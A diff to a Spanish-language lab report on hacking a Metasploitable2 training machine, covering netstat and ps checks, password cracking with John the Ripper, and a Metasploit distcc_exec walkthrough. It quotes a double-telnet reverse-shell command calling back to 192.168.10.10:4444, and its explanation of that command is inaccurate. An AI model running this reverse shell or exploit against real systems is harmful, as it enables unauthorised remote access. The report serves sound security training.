@@ -105,7 +105,8 @@ A continuación, se comprobó con el comando "id" que usuario éramos en la máq
 viendo que teníamos el "uid" y "gid" 0, que corresponde al usuario root.	
 
 Posteriormente, se utilizó el comando "netstat", pasándole su salida al comando "grep" para filtrar
-todas aquellas conexiones de red que utilizan el puerto 4444, y se redirigió .
+todas aquellas conexiones de red que utilizan el puerto 4444, y se guardó en el fichero 
+/var/tmp/samba.tx la información completa de los procesos que llevan la conexión.
 
 	netstat -naop | grep 4444
 		-n: muestra la dirección numérica de la máquina.
@@ -113,10 +114,35 @@ todas aquellas conexiones de red que utilizan el puerto 4444, y se redirigió .
 		-o: incluye la información de los timers.
 		-p: muestra el pid del programa al que pertenece el socket.
 	ps -eaf | grep 4444 >> /var/tmp/samba.tx
-		-e: 
-		-a:
-		-f:
+		-e: selecciona todos los procesos.
+		-a: selecciona todos los procesos menos los ligados a una terminal.
+		-f: muestra el listado completo.
 
+A continuación, se comprobó en una sesión normal en la máquina "metasploitable2" las conexiones
+establecidas y los nuevos procesos ejecutados relacionados con la conexión entre las dos máquinas:
+
+	1.- Mostramos las conexiones con el puerto 4444.
+		sudo netstat -naop | grep 4444
+	2.- Mostramos los procesos relacionados con la primera conexión.
+		ps aux | grep <PID asociado a primer telnet>
+	3.- Mostramos los procesos relacionados con la segunda conexión.
+		ps aux | grep <PID asociado a primer telnet>
+	4.- Mostramos los procesos asociados con el puerto 4444.
+		ps aux | grep 4444
+
+Como se ha podido ver en los puntos dos y tres, hay dos procesos ligados a la conexión establecida
+entre las dos máquina; sin embargo, se ha comprobado en el punto cuatro que hay un tercer proceso
+ejecutando el siguiente comando:
+
+	sh –c (sleep 4197|telnet 192.168.10.10 4444|while : ; do sh && break;
+						 done 2>&1|telnet 192.168.10.10 4444 >/dev/null 2>&1 &)
+
+/******************
+El comando se ejecuta en segundo plano, y consiste en un bucle encargado de redirigir toda la 
+información obtenida de la conexión a un fichero, tanto la salida estándar, como la salida de error.
+El propósito principal es que no aparezca por pantalla ninguna información de que se ha establecido
+una conexión y se ha podido acceder a la máquina remotamente.
+************/
 
 Parte III: Crackear contraseñas con John the Ripper
 -----------------------------------------------------------------------------------------------------
@@ -159,3 +185,28 @@ obtiene la nueva contraseña):
 	postgres:postgres:108:117:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash
 	user:user:1001:1001:just a user,111,,:/home/user:/bin/bash
 	service:service:1002:1002:,,,:/home/service:/bin/bash
+
+
+Parte IV: Extra
+-----------------------------------------------------------------------------------------------------
+
+En la parte extra, se ha aprovechado otra vulnerabilidad de la máquina consistente en una puerta 
+trasera en el servicio "distcc". Dicho servicio sirve para repartir tareas de compilación a través de
+la red entre distintos participantes. En nuestro caso, este servicio se puede atacar fácilmente
+haciendo que se ejecute un cierto comando a nuestra elección:
+
+	1.- Seleccionamos el módulo.
+		use exploit/unix/misc/distcc_exec
+	2.- Asignamos parámetros.
+		set RHOST 192.168.10.11
+	3.- Ejecutamos el exploit.
+		exploit
+
+Para comprobar que se ha realizado la conexión con éxito, se ejecuta en la sesión abierta el comando
+"uname -a" e "id", obteniendo los siguientes resultados:
+	
+	1.- Linux metasploitable 2.6.24-16-server #1 SMP Thu Apr 10 13:58:00 UTC 2008 i686 GNU/Linux
+	2.- uid=1(daemon) gid=1(daemon) groups=1(daemon)
+
+En conclusión, se ha accedido a la máquina "metaspoitable2" satisfactoriamente, y en la sesión abierta,
+ya se puede ejecutar cualquier comando en dicha máquina.
